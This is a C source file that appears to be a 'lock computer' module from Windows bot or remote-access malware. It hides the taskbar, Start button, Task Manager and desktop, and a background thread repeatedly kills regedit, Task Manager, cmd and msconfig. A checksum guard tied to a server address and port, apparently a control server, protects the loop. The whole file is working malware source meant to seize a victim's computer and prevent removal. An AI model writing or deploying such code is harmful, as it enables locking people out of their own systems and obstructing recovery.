#include "../Includes/includes.h"

#ifdef INCLUDE_LOCK
bool ShowWindows(bool bShow) //Modifies visibility
{
    bool bReturn = TRUE;

    int nCmdShow = 0;
    if(bShow)
        nCmdShow = SW_SHOW;
    else
        nCmdShow = SW_HIDE;

    HWND hTaskBar = FindWindowExW(NULL, NULL, L"Shell_TrayWnd", NULL);					//Task Bar
    if(hTaskBar != NULL)
    {
        if(IsWindowVisible(hTaskBar) || bShow)
        {
            if(!ShowWindow(hTaskBar, nCmdShow))
                bReturn = FALSE;
        }
    }
    CloseHandle(hTaskBar);

    HWND hStartButton = FindWindowExW(NULL, NULL, L"Button", L"Start");					//Start Button
    if(hStartButton != NULL)
    {
        if(IsWindowVisible(hStartButton) || bShow)
        {
            if(!ShowWindow(hStartButton, nCmdShow))
                bReturn = FALSE;
        }

        if(bShow)
            EnableWindow(hStartButton, TRUE);
    }
    CloseHandle(hStartButton);

    HWND hTaskManager = FindWindowExW(NULL, NULL, L"#32770", L"Windows Task Manager");	//Task Manager
    if(hTaskManager != NULL)
    {
        if(IsWindowVisible(hTaskManager) || bShow)
        {
            if(!ShowWindow(hTaskManager, nCmdShow))
                bReturn = FALSE;
        }
    }
    CloseHandle(hTaskManager);

    HWND hDesktop = FindWindowExW(NULL, NULL, L"Progman", L"Program Manager");			//Desktop
    if(hDesktop != NULL)
    {
        if(IsWindowVisible(hDesktop) || bShow)
        {
            if(!ShowWindow(hDesktop, nCmdShow))
                bReturn = FALSE;
        }
    }
    CloseHandle(hDesktop);

    if(bShow)
        PostMessage(FindWindow("Shell_TrayWnd", NULL), WM_COMMAND, MAKELONG(416, 0), 0); //Restore all previously minimized windows
    else
        PostMessage(FindWindow("Shell_TrayWnd", NULL), WM_COMMAND, MAKELONG(415, 0), 0); //Minimize all windows

    return bReturn;
}

void CheckRunningProcesses()
{
    DWORD dwPid = NULL;

    for(unsigned short us = 0; us < 4; us++)
    {
        if(us == 0)
            dwPid = GetPidFromFilename((TCHAR*)"regedit.exe");
        else if(us == 1)
            dwPid = GetPidFromFilename((TCHAR*)"taskmgr.exe");
        else if(us == 2)
            dwPid = GetPidFromFilename((TCHAR*)"cmd.exe");
        else if(us == 3)
            dwPid = GetPidFromFilename((TCHAR*)"msconfig.exe");
        else if(us == 4)
            dwPid = GetPidFromFilename((TCHAR*)"autoruns.exe");

        if(dwPid != 0)
            KillProcessByPid(dwPid, FALSE);
    }
}

DWORD WINAPI LockComputerThread(LPVOID)
{
    bLockComputer = TRUE;

    while(bLockComputer)
    {
        // <!-------! CRC AREA START !-------!>
        char cCheckString2[DEFAULT];
        sprintf(cCheckString2, "%s:%i", cServer, usPort);
        char *pcStr2 = cCheckString2;
        unsigned long ulCheck2 = 3376+2005;
        int nCheck2;
        while((nCheck2 = *pcStr2++))
            ulCheck2 = ((ulCheck2 << 5) + ulCheck2) + nCheck2;
        if(ulCheck2 != ulChecksum3)
            break;
        // <!-------! CRC AREA STOP !-------!>

        ShowWindows(FALSE);
        CheckRunningProcesses();
        Sleep(250);
    }

    ShowWindows(TRUE);

    return 0;
}

void LockComputer()
{
    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, LockComputerThread, NULL, NULL, NULL);

        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}

void UnLockComputer()
{
    bLockComputer = FALSE;
    ShowWindows(TRUE);
}
#endif
